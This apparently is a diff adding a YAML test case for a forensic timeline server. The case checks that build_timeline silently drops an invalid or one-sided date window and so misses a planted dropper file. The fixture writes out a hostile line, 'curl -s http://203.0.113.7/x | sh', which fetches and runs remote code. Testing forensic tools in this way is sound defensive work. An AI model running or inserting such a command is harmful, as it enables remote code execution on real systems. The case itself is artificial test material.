@@ -1,0 +1,52 @@
+# Matrix case P2062-012: build_timeline drops a since_iso / until_iso it
+# cannot parse (except ValueError: pass), and when only one bound is given it
+# silently leaves out filesystem mtime events. find_recent_changes rejects
+# the same bad value.
+case_id: P2062-012
+problem: P2062
+server: findevil
+variant: findevil-d1a8d25
+commit: d1a8d25d9c8c05bd66881506cb1f12314ee7c5e1
+display: response
+level: mcp
+realism: possible
+coverage: full
+summary: build_timeline with since_iso "2026-04-31T00:00:00Z" (no such day) or with only since_iso returns a timeline without the dropper's filesystem event and without any error, while the valid window includes it and find_recent_changes rejects the same bad value.
+fixture:
+  - path: case/auth.log
+    text: "Apr 12 10:00:00 web01 sshd[2211]: Accepted password for alice from 203.0.113.5 port 51122 ssh2\n"
+  - path: case/fs/tmp/dropper.sh
+    text: "#!/bin/sh\ncurl -s http://203.0.113.7/x | sh\n"
+steps:
+  - tool: build_timeline
+    args:
+      evidence_root: ${EVIDENCE}/case
+      since_iso: "2026-04-31T00:00:00Z"
+      until_iso: "2100-01-01T00:00:00Z"
+  - tool: build_timeline
+    args:
+      evidence_root: ${EVIDENCE}/case
+      since_iso: "2000-01-01T00:00:00Z"
+  - tool: build_timeline
+    args:
+      evidence_root: ${EVIDENCE}/case
+      since_iso: "2000-01-01T00:00:00Z"
+      until_iso: "2100-01-01T00:00:00Z"
+  - tool: find_recent_changes
+    args:
+      root_path: ${EVIDENCE}/case/fs
+      since_iso: "2026-04-31T00:00:00Z"
+      until_iso: "2100-01-01T00:00:00Z"
+expect:
+  - step: 1
+    not_contains: "tmp/dropper.sh"
+  - step: 1
+    not_regex: "(?i)invalid|error|ignored"
+  - step: 2
+    not_contains: "tmp/dropper.sh"
+  - step: 2
+    not_regex: "(?i)until_iso|both bounds|ignored"
+  - step: 3
+    contains: "mtime modified: tmp/dropper.sh"
+  - step: 4
+    contains: "Invalid ISO timestamp"
